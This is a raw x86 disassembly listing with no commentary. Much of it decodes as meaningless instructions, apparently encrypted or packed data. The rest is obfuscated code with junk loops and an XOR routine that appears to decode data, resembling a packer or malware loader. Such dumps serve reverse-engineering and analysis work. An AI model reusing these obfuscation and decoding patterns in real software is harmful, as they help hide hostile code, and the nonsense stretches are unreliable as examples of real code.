  410af1:	sahf   
  410af2:	in     eax,0x2a
  410af4:	call   0x7b07:0x7cd54870
  410afb:	js     0x410b76
  410afd:	adc    eax,DWORD PTR [eax]
  410aff:	jl     0x410aac
  410b01:	mov    BYTE PTR [edx+0xe3bb53f],bl
  410b07:	add    esi,DWORD PTR [ebp+0x2d5e3ffb]
  410b0d:	dec    esi
  410b0e:	(bad)  
  410b0f:	sbb    eax,0x64736db0
  410b14:	popa   
  410b15:	dec    edx
  410b16:	rcl    DWORD PTR [ebx+0xf],1
  410b19:	xchg   ebx,eax
  410b1a:	mov    ah,0xd
  410b1c:	jmp    FWORD PTR [eax-0x2ea73ff7]
  410b22:	xchg   ebp,eax
  410b23:	xor    DWORD PTR [ebx+0x79c69d62],esp
  410b29:	inc    edx
  410b2a:	mov    ?,WORD PTR [ebp+0x47]
  410b2d:	pop    ss
  410b2e:	jne    0x410ad4
  410b30:	xor    eax,0xbfa3b79a
  410b35:	push   ds
  410b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b37:	dec    ebp
  410b38:	pop    esi
  410b39:	out    dx,al
  410b3a:	fwait
  410b3b:	and    ah,bl
  410b3d:	es mov edi,cs
  410b40:	jo     0x410b69
  410b42:	and    al,0x64
  410b44:	pop    edx
  410b45:	push   edi
  410b46:	popf   
  410b47:	push   esp
  410b48:	xchg   ecx,eax
  410b49:	push   edi
  410b4a:	mov    WORD PTR [eax-0x6f],es
  410b4d:	outs   dx,DWORD PTR ds:[esi]
  410b4e:	aad    0xac
  410b50:	push   ecx
  410b51:	xor    ah,BYTE PTR [eax+0x46b09d85]
  410b57:	(bad)  
  410b58:	pushf  
  410b59:	mov    WORD PTR [edi-0x1968a65a],?
  410b5f:	xchg   ecx,eax
  410b60:	push   edi
  410b61:	aaa    
  410b62:	fmul   DWORD PTR [edi+0x5f6e723b]
  410b68:	pushf  
  410b69:	gs in  al,0x2d
  410b6c:	loopne 0x410b9a
  410b6e:	pop    ebp
  410b6f:	and    BYTE PTR [edx],bl
  410b71:	inc    esp
  410b72:	outs   dx,BYTE PTR ds:[esi]
  410b73:	push   edi
  410b74:	adc    BYTE PTR [ebx-0x255f53dd],ch
  410b7a:	pop    ecx
  410b7b:	push   esi
  410b7c:	bound  edx,QWORD PTR [ebx]
  410b7e:	xchg   ebx,eax
  410b7f:	in     al,0xa5
  410b81:	adc    DWORD PTR [esi],esi
  410b83:	sahf   
  410b84:	mov    dh,0xb7
  410b86:	pop    esi
  410b87:	(bad)  
  410b88:	jg     0x410bc7
  410b8a:	dec    ebp
  410b8b:	stc    
  410b8c:	mov    ?,ebx
  410b8e:	(bad)  
  410b8f:	pusha  
  410b90:	aas    
  410b91:	aam    0xfa
  410b93:	xchg   DWORD PTR [eax-0x44],ecx
  410b96:	jl     0x410c11
  410b98:	(bad)  
  410b9a:	retf   0xfc08
  410b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b9e:	rol    DWORD PTR [eax+0x3fc63544],cl
  410ba4:	int3   
  410ba5:	xchg   ebx,eax
  410ba6:	inc    DWORD PTR [ebp+0x7733865f]
  410bac:	int    0x12
  410bae:	into   
  410baf:	cld    
  410bb0:	push   edi
  410bb1:	push   ebx
  410bb2:	push   ebx
  410bb3:	sbb    edi,ecx
  410bb5:	ins    BYTE PTR es:[edi],dx
  410bb6:	pop    ds
  410bb7:	shl    DWORD PTR [ebp-0x24768e23],1
  410bbd:	ins    DWORD PTR es:[edi],dx
  410bbe:	and    al,0x9f
  410bc0:	pop    esi
  410bc1:	sbb    eax,0x79b57986
  410bc6:	sub    BYTE PTR [edi],dl
  410bc8:	pop    eax
  410bc9:	ja     0x410b9b
  410bcb:	mov    esi,0x2b49feb2
  410bd0:	inc    ebp
  410bd1:	xchg   esp,eax
  410bd2:	sub    ebx,ebx
  410bd4:	mov    esp,0x621ef66
  410bd9:	cdq    
  410bda:	or     eax,0x435683d
  410bdf:	ret    
  410be0:	mov    bl,0x4a
  410be2:	scas   al,BYTE PTR es:[edi]
  410be3:	icebp  
  410be4:	sub    eax,0x21009a7b
  410be9:	pushf  
  410bea:	js     0x410c36
  410bec:	shl    BYTE PTR [ebx-0x723bbe6d],cl
  410bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bf3:	push   0x79a280e2
  410bf8:	ret    0x146e
  410bfb:	mov    ebx,0x349057e2
  410c00:	adc    ch,al
  410c02:	cmp    BYTE PTR [edi],0x70
  410c05:	push   ds
  410c06:	and    BYTE PTR [ecx-0x414a91ab],ch
  410c0c:	adc    esp,DWORD PTR [esi]
  410c0e:	sub    al,0x27
  410c10:	shl    cl,1
  410c12:	addr16 push esi
  410c14:	xchg   ecx,eax
  410c15:	sar    al,cl
  410c17:	dec    ecx
  410c18:	sub    al,0x45
  410c1a:	dec    ebx
  410c1b:	cmp    BYTE PTR [edi+0x19053e5b],cl
  410c21:	(bad)  
  410c23:	dec    eax
  410c24:	or     eax,DWORD PTR [ebx+0x5232feb]
  410c2a:	sub    al,0x26
  410c2c:	enter  0x95e7,0x28
  410c30:	mov    ecx,0xb0a419b
  410c35:	outs   dx,DWORD PTR ds:[esi]
  410c36:	(bad)  
  410c3a:	mov    edi,0x8a177a71
  410c3f:	xchg   ebx,eax
  410c40:	(bad)  
  410c41:	sub    BYTE PTR [ebx+0x76e61ebf],bl
  410c47:	inc    ecx
  410c48:	xor    dh,BYTE PTR [edi+0x5559ecab]
  410c4e:	sar    BYTE PTR [eax],0x76
  410c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c52:	inc    edi
  410c53:	loopne 0x410c54
  410c55:	jmp    0x862f:0x2a5cfff1
  410c5c:	jbe    0x410c10
  410c5e:	das    
  410c5f:	outs   dx,DWORD PTR ds:[esi]
  410c60:	es pop ds
  410c62:	mov    dl,0x10
  410c64:	dec    ecx
  410c65:	sub    esi,edi
  410c67:	mov    ecx,0x7c36d7f4
  410c6c:	jl     0x410c13
  410c6e:	retf   0x7356
  410c71:	int    0xf
  410c73:	mov    ds:0xffb05320,eax
  410c78:	xchg   edi,eax
  410c79:	sub    cl,BYTE PTR [edx+ebx*8+0x33]
  410c7d:	push   cs
  410c7e:	add    edi,esp
  410c80:	dec    edx
  410c81:	adc    al,0x7f
  410c83:	loopne 0x410c3a
  410c85:	mov    al,0x82
  410c87:	mov    ebp,0x501c2805
  410c8c:	clc    
  410c8d:	add    al,0x55
  410c8f:	pop    ecx
  410c90:	cmp    DWORD PTR [ecx+0x55e31862],edi
  410c96:	sahf   
  410c97:	dec    esp
  410c98:	gs inc ecx
  410c9a:	loope  0x410c74
  410c9c:	push   edi
  410c9d:	adc    al,0x4b
  410c9f:	mov    edi,es
  410ca1:	test   edx,edx
  410ca3:	(bad)  
  410ca4:	and    edx,esi
  410ca6:	adc    al,0xd7
  410ca8:	xchg   ebp,eax
  410ca9:	adc    dl,BYTE PTR [eax-0x65]
  410cac:	mov    ch,0xfa
  410cae:	mov    dh,0xfe
  410cb0:	inc    eax
  410cb1:	mov    ch,0xba
  410cb3:	add    ebx,edi
  410cb5:	scas   eax,DWORD PTR es:[edi]
  410cb6:	pop    edx
  410cb7:	hlt    
  410cb8:	inc    esi
  410cb9:	cli    
  410cba:	xchg   esi,eax
  410cbb:	add    esi,ecx
  410cbd:	stos   BYTE PTR es:[edi],al
  410cbe:	aaa    
  410cbf:	adc    DWORD PTR [ebx+esi*1],ecx
  410cc2:	mov    ecx,esi
  410cc4:	xchg   esi,eax
  410cc5:	mul    eax
  410cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cc8:	push   edi
  410cc9:	xor    eax,0x7ae4a92
  410cce:	add    BYTE PTR [ecx],cl
  410cd0:	add    eax,0xdd870b38
  410cd5:	popa   
  410cd6:	mov    al,0x28
  410cd8:	and    edx,edi
  410cda:	jle    0x410d25
  410cdc:	adc    BYTE PTR [edi],0x7a
  410cdf:	call   DWORD PTR [ebx]
  410ce1:	xchg   edi,eax
  410ce2:	int3   
  410ce3:	cmp    BYTE PTR [esi+0xede8984],0xf6
  410cea:	add    DWORD PTR [eax],eax
  410cec:	add    ah,BYTE PTR [eax]
  410cee:	and    eax,0x28e457a0
  410cf3:	and    al,0x9a
  410cf5:	cmp    edx,ebx
  410cf7:	shl    DWORD PTR [edi+0x346200f4],cl
  410cfd:	enter  0x3274,0xa8
  410d01:	inc    esi
  410d02:	(bad)  
  410d03:	sahf   
  410d04:	cmp    edi,DWORD PTR ds:0xb99398d9
  410d0a:	mov    ebx,0x772c9f99
  410d0f:	out    dx,eax
  410d10:	jne    0x410d29
  410d12:	push   ebx
  410d13:	mov    cl,BYTE PTR [edi]
  410d15:	(bad)  
  410d16:	dec    BYTE PTR [edi+ecx*4]
  410d19:	mov    bl,0x7
  410d1b:	inc    edx
  410d1c:	mov    bh,0xd2
  410d1e:	xchg   ecx,eax
  410d1f:	pop    eax
  410d20:	(bad)  [ecx]
  410d22:	dec    eax
  410d23:	pop    ds
  410d24:	pop    esi
  410d25:	outs   dx,DWORD PTR ds:[esi]
  410d26:	jnp    0x410cc2
  410d28:	stos   BYTE PTR es:[edi],al
  410d29:	pop    edx
  410d2a:	xlat   BYTE PTR ds:[ebx]
  410d2b:	in     eax,0x30
  410d2d:	clc    
  410d2e:	mov    eax,0xba85db77
  410d33:	daa    
  410d34:	pop    ebx
  410d35:	outs   dx,DWORD PTR ds:[esi]
  410d36:	xchg   esi,eax
  410d37:	and    al,0x15
  410d39:	dec    esi
  410d3a:	loop   0x410d08
  410d3c:	or     al,0xc
  410d3e:	ret    0x1af8
  410d41:	push   edi
  410d42:	or     al,0x8a
  410d44:	ret    0x6c90
  410d47:	(bad)  
  410d48:	in     al,dx
  410d49:	sub    eax,ecx
  410d4b:	or     al,0xbf
  410d4d:	ja     0x410ce5
  410d4f:	mov    cl,0xae
  410d51:	in     al,dx
  410d52:	mov    al,ds:0xae10e837
  410d57:	mov    al,ds:0x5b6d9411
  410d5c:	push   ecx
  410d5d:	jp     0x410d03
  410d5f:	int    0x78
  410d61:	int    0xf6
  410d63:	rcl    DWORD PTR [ebx],1
  410d65:	or     eax,0xdcd73ad2
  410d6a:	mov    ebp,0xdd772874
  410d6f:	or     eax,0x7c87276
  410d74:	and    al,0x14
  410d76:	repnz cmc 
  410d78:	fmul   st(6),st
  410d7a:	(bad)  
  410d7b:	out    0xa7,eax
  410d7d:	ror    ebp,0x28
  410d80:	mov    ds:0x8c9b0e85,eax
  410d85:	fsubr  DWORD PTR [ecx-0xa]
  410d88:	cmc    
  410d89:	mov    ds:0xd9b52e12,al
  410d8e:	in     eax,0xf
  410d90:	shl    DWORD PTR [esi],0xaa
  410d93:	ins    DWORD PTR es:[edi],dx
  410d94:	cli    
  410d95:	push   ebp
  410d96:	mov    al,ds:0x494098a7
  410d9b:	mov    eax,0x66a429e3
  410da0:	gs push es
  410da2:	and    DWORD PTR [ebx-0x6df22cf1],esi
  410da8:	mov    esi,0x2ed6b97a
  410dad:	ds popa 
  410daf:	pop    esi
  410db0:	xlat   BYTE PTR ds:[ebx]
  410db1:	pop    es
  410db2:	mov    gs,WORD PTR [esi-0x4af8640f]
  410db8:	mov    edx,0x51de5bd9
  410dbd:	mov    ecx,0x3da740aa
  410dc2:	push   esi
  410dc3:	mov    eax,ds:0xc89e7705
  410dc8:	adc    BYTE PTR [eax],ah
  410dca:	pop    ebp
  410dcb:	hlt    
  410dcc:	adc    BYTE PTR [ecx+edx*8+0x4416a19c],cl
  410dd3:	push   ebp
  410dd4:	rcl    DWORD PTR [edi],0x83
  410dd7:	adc    al,0xbc
  410dd9:	pop    esp
  410dda:	fistp  QWORD PTR [ebx]
  410ddc:	cwde   
  410ddd:	add    DWORD PTR [ebx],edx
  410ddf:	jmp    0x32337296
  410de4:	xlat   BYTE PTR ds:[ebx]
  410de5:	iret   
  410de6:	mov    ecx,DWORD PTR [esi]
  410de8:	inc    esp
  410de9:	call   0x6e5f:0xf53cd9da
  410df0:	mov    DWORD PTR [ecx+0x55],eax
  410df3:	stos   DWORD PTR es:[edi],eax
  410df4:	cmp    edi,DWORD PTR [edx-0x3b49a38c]
  410dfa:	ss adc eax,0xcf190dff
  410e00:	fsubr  st(6),st
  410e02:	and    eax,0x4767e5a0
  410e07:	or     al,0x17
  410e09:	ins    BYTE PTR es:[edi],dx
  410e0a:	pop    es
  410e0b:	nop
  410e0c:	out    0x6d,al
  410e0e:	shr    DWORD PTR [esi-0x1c],0x3d
  410e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e13:	adc    BYTE PTR [ebx-0x68157cba],ah
  410e19:	out    0x58,eax
  410e1b:	push   es
  410e1c:	add    al,0xeb
  410e1e:	aam    0xb7
  410e20:	lahf   
  410e21:	outs   dx,DWORD PTR ds:[esi]
  410e22:	daa    
  410e23:	(bad)  
  410e24:	and    edi,DWORD PTR [ecx+edx*8]
  410e27:	hlt    
  410e28:	and    al,0x31
  410e2a:	push   ecx
  410e2b:	inc    esp
  410e2c:	shl    DWORD PTR [ebx-0x264edae0],cl
  410e32:	pushf  
  410e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e34:	cmp    ebx,DWORD PTR [ebx+0x24aec339]
  410e3a:	das    
  410e3b:	adc    DWORD PTR [ebp+0x4c02afe9],ebx
  410e41:	(bad)  
  410e43:	jo     0x410e46
  410e45:	ins    DWORD PTR es:[edi],dx
  410e46:	sub    eax,0xfc26b211
  410e4b:	das    
  410e4c:	push   edi
  410e4d:	ja     0x410e8e
  410e4f:	mov    bl,0xa8
  410e51:	pop    es
  410e52:	dec    eax
  410e53:	mov    ah,0x5a
  410e55:	xor    DWORD PTR [edx-0x7ca3d8b0],eax
  410e5b:	sub    ebp,DWORD PTR [edi]
  410e5d:	mov    dl,0x5b
  410e5f:	mov    edx,0x1bc72d06
  410e64:	dec    esi
  410e65:	and    DWORD PTR [edx+0x67],ebx
  410e68:	call   0x9bc2b58a
  410e6d:	daa    
  410e6e:	outs   dx,DWORD PTR es:[esi]
  410e70:	in     eax,0x19
  410e72:	and    DWORD PTR [edi+0x8],eax
  410e75:	jo     0x410ecb
  410e77:	mov    esi,0x175eed25
  410e7c:	cli    
  410e7d:	pop    eax
  410e7e:	sahf   
  410e7f:	sbb    esi,ebp
  410e81:	sub    al,0x99
  410e83:	jne    0x410e09
  410e85:	sbb    eax,ebp
  410e87:	cdq    
  410e88:	pop    ebp
  410e89:	mov    esi,0xf975bc6c
  410e8e:	or     DWORD PTR [edx],esp
  410e90:	test   eax,0x97887fbf
  410e95:	cli    
  410e96:	xchg   ecx,eax
  410e97:	cmp    al,0x7a
  410e99:	inc    edx
  410e9a:	jge    0x410f02
  410e9c:	xchg   edx,eax
  410e9d:	push   ebx
  410e9e:	test   eax,0x9efaf0c6
  410ea3:	jnp    0x410eda
  410ea5:	mov    edi,0x6400f0ec
  410eaa:	mov    cl,0x11
  410eac:	push   esi
  410ead:	inc    esi
  410eae:	and    edx,DWORD PTR ss:[edi]
  410eb1:	or     esi,DWORD PTR [edi+edi*8]
  410eb4:	call   0xb965dab5
  410eb9:	pop    esi
  410eba:	mov    eax,ds:0xf3e09314
  410ebf:	retf   0x2bb2
  410ec2:	xchg   ebp,eax
  410ec3:	push   ds
  410ec4:	mov    edx,0x4c1fa89b
  410ec9:	dec    ecx
  410eca:	inc    edx
  410ecb:	cmp    BYTE PTR [ecx+ebx*4-0x51],al
  410ecf:	mov    ah,0xea
  410ed1:	jo     0x410e71
  410ed3:	pop    es
  410ed4:	mov    cl,0xd3
  410ed6:	jge    0x410ea1
  410ed8:	stc    
  410ed9:	pusha  
  410eda:	push   0x19f94c51
  410edf:	sbb    al,al
  410ee1:	sub    edx,DWORD PTR [esi+0x17e82700]
  410ee7:	mov    edx,DWORD PTR [eax+eiz*4-0x62c1ccd5]
  410eee:	outs   dx,DWORD PTR ds:[esi]
  410eef:	cmp    DWORD PTR [edx],esi
  410ef1:	mov    ds:0x3cd01905,eax
  410ef6:	add    eax,0xe9d73094
  410efb:	retf   
  410efc:	xchg   esp,eax
  410efd:	into   
  410efe:	inc    edi
  410eff:	mov    ax,ds:0x65e286a9
  410f05:	ror    BYTE PTR [edx],cl
  410f07:	mov    edx,0xbda7f41f
  410f0c:	push   eax
  410f0d:	and    DWORD PTR [esi+0x5e5f2013],edx
  410f13:	lods   al,BYTE PTR ds:[esi]
  410f14:	test   BYTE PTR [edx],dl
  410f16:	and    edx,eax
  410f18:	mov    dh,0x1b
  410f1a:	mov    eax,0xf27b56c0
  410f1f:	mov    edi,0x84be488b
  410f24:	pop    ebx
  410f25:	dec    ecx
  410f26:	stc    
  410f27:	test   al,0x3d
  410f29:	sbb    al,0x9c
  410f2b:	mov    dl,0x2f
  410f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f2e:	and    cl,dl
  410f30:	dec    esi
  410f31:	cwde   
  410f32:	outs   dx,BYTE PTR ds:[esi]
  410f33:	sar    bh,cl
  410f35:	lahf   
  410f36:	add    eax,0x1aba8f6d
  410f3b:	(bad)  
  410f3c:	aas    
  410f3d:	inc    ebx
  410f3e:	jmp    0x46ea6393
  410f43:	xor    esi,DWORD PTR [ecx+ebx*2+0x50]
  410f47:	jle    0x410fc2
  410f49:	inc    ebp
  410f4a:	xchg   edi,eax
  410f4b:	fbld   TBYTE PTR [eax+0x5a]
  410f4e:	mov    eax,ds:0xdf062bf4
  410f53:	js     0x410fd3
  410f55:	sbb    DWORD PTR [ebx-0x20],eax
  410f58:	cdq    
  410f59:	dec    ecx
  410f5a:	jno    0x410f5d
  410f5c:	out    0xcc,al
  410f5e:	xchg   ebx,eax
  410f5f:	dec    edx
  410f60:	shl    DWORD PTR [eax-0x1830e0bd],1
  410f66:	push   ebp
  410f67:	sbb    al,0xef
  410f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f6b:	push   0xffffffa4
  410f6d:	mov    dl,0xa4
  410f6f:	sub    bl,al
  410f71:	jbe    0x410f8b
  410f73:	fadd   QWORD PTR [ebp-0x2bcd60f7]
  410f79:	jg     0x410f4b
  410f7b:	int    0x57
  410f7d:	push   ebx
  410f7e:	hlt    
  410f7f:	and    DWORD PTR ds:0xc4d9c3c6,edi
  410f85:	mov    esp,0xfa74d2df
  410f8a:	fistp  QWORD PTR fs:[ecx-0x5ac10132]
  410f91:	and    ebx,DWORD PTR [eax+0x13]
  410f94:	pushf  
  410f95:	(bad)  
  410f97:	xchg   esp,eax
  410f98:	cs jne 0x410ff4
  410f9b:	punpcklbw mm5,DWORD PTR [esp+ebx*4+0x6a]
  410fa0:	pop    edx
  410fa1:	inc    ecx
  410fa2:	pushf  
  410fa3:	cmp    ah,BYTE PTR [eax-0x7634c9e4]
  410fa9:	(bad)  
  410faa:	in     eax,dx
  410fab:	in     eax,dx
  410fac:	cmp    al,0xff
  410fae:	lea    ecx,[ebx-0x57ddae80]
  410fb4:	fmulp  st(0),st
  410fb6:	inc    ebp
  410fb7:	sbb    DWORD PTR [edx],edi
  410fb9:	loop   0x411005
  410fbb:	in     al,dx
  410fbc:	cmp    DWORD PTR [edi-0x7bdd4d1f],eax
  410fc2:	call   0xdeeb:0x81335fba
  410fc9:	pop    eax
  410fca:	pop    ebx
  410fcb:	call   0x67c37a44
  410fd0:	shl    BYTE PTR [esp+eiz*8-0x41],cl
  410fd4:	jne    0x410fa9
  410fd6:	adc    dh,bl
  410fd8:	mov    cr0,ebp
  410fdb:	cs or  eax,0xc13fe899
  410fe1:	push   ebp
  410fe2:	dec    ebx
  410fe3:	mov    ds:0x12eb134,eax
  410fe8:	or     DWORD PTR [esi],ebx
  410fea:	mov    BYTE PTR [eax],al
  410fec:	mov    bl,0xa4
  410fee:	mov    eax,ds:0x877423c
  410ff3:	mov    al,ds:0xaf0e59d8
  410ff8:	jl     0x410fe4
  410ffa:	adc    edx,DWORD PTR [ecx+edx*4]
  410ffd:	xor    eax,0xd467d4b9
  411002:	inc    edx
  411003:	add    eax,0x34e59487
  411008:	sbb    eax,0x11a3ac83
  41100d:	rcl    DWORD PTR [ebp-0x3d],1
  411010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411011:	dec    eax
  411012:	in     al,dx
  411013:	(bad)  
  411014:	push   DWORD PTR [edx-0x50]
  411017:	ins    DWORD PTR es:[edi],dx
  411018:	outs   dx,BYTE PTR ds:[esi]
  411019:	das    
  41101a:	pushf  
  41101b:	sahf   
  41101c:	shl    BYTE PTR [ebp-0x6b4d75fa],0x5
  411023:	push   edi
  411024:	mov    ecx,DWORD PTR [ebp+0x8]
  411027:	mov    eax,0x8a8d
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
